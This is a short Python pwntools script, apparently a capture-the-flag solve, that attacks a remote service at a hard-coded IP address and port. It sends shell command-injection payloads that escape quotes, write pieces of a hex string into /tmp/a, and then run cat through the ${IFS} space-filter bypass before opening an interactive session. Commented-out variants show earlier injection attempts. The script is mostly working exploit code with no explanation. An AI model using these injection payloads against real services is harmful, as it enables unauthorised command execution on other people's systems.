from pwn import *

context.terminal = ['gnome-terminal','--window','-e']
context.log_level = 'DEBUG'
#for local
#sh = gdb.debug("./main")
#for remote
#sh = remote("ip",1234)
"""
#payload = b"3b9aafa12aceeccd29a154766194a964'||'"
payload = b"'3b9aafa12aceeccd29a154766194a964"
#payload = "abc'>a.txt||'"
sh.sendline(payload)
sh.interactive()
"""
sh = remote("54.225.38.91",1025)
payload = "3b9aafa12aceeccd29a15'>/tmp/a||'"
sh.sendline(payload)
sh.recv()
sh.close()
sh = remote("54.225.38.91",1025)
payload = "4766194a964'>>/tmp/a||'"
sh.sendline(payload)
sh.recv()
sh.close()
sh = remote("54.225.38.91",1025)
payload = "'|cat${IFS}/tmp/a||'"
sh.sendline(payload)
sh.recv()
sh.interactive()
